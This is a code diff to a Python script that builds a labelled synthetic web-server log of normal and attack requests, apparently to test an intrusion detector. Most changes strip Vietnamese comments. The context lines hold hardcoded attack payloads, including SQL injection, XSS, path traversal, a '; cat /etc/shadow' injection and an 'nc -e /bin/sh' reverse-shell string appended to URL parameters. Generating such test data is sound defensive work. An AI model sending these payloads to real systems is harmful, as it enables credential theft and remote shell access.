@@ -4,8 +4,8 @@ from datetime import datetime, timedelta
 
 # --- CẤU HÌNH ---
 OUTPUT_FILE = "dataset_evaluated.log"
-NUM_NORMAL = 2000   # Số lượng log sạch
-NUM_ATTACKS = 2000  # Số lượng log tấn công (Đảm bảo đủ 2000)
+NUM_NORMAL = 2000   
+NUM_ATTACKS = 2000  
 
 # Nguồn Payload (Dự phòng thêm payload cứng nếu mất mạng)
 PAYLOAD_SOURCES = {
@@ -19,7 +19,7 @@ HARDCODED_PAYLOADS = [
     "' OR '1'='1", "UNION SELECT 1, user, pass FROM users", "<script>alert(1)</script>",
     "../../../../etc/passwd", "; cat /etc/shadow", "| nc -e /bin/sh 1.2.3.4 4444",
     "/admin/config.php.bak", "Waitfor delay '0:0:10'", "javascript:alert(1)"
-] * 50 # Nhân bản lên để có ít nhất vài trăm mẫu cơ bản
+] * 50 
 
 # Dữ liệu giả lập cho Log sạch
 NORMAL_PATHS = ["/index.php", "/home", "/about", "/contact", "/products", "/login", "/api/user", "/assets/style.css", "/js/main.js", "/images/banner.jpg"]
@@ -36,7 +36,7 @@ def download_payloads():
         try:
             r = requests.get(url, timeout=5)
             if r.status_code == 200:
-                lines = [l.strip() for l in r.text.splitlines() if len(l) > 4] # Lọc dòng quá ngắn
+                lines = [l.strip() for l in r.text.splitlines() if len(l) > 4] 
                 print(f"   + {name}: {len(lines)} mẫu")
                 attacks.extend(lines)
         except:
@@ -89,8 +89,6 @@ def generate():
             base = random.choice(["/search?q=", "/prod?id=", "/login?u=", "/?cmd="])
             full_url = f"{base}{payload}"
             
-            # NHÃN TẤN CÔNG: Thêm marker (Simulated-Attack) vào User-Agent
-            # Đây là CHÌA KHÓA để chấm điểm sau này
             ua = "Mozilla/5.0 (Windows NT 10.0) (Simulated-Attack)" 
             status = 200
             
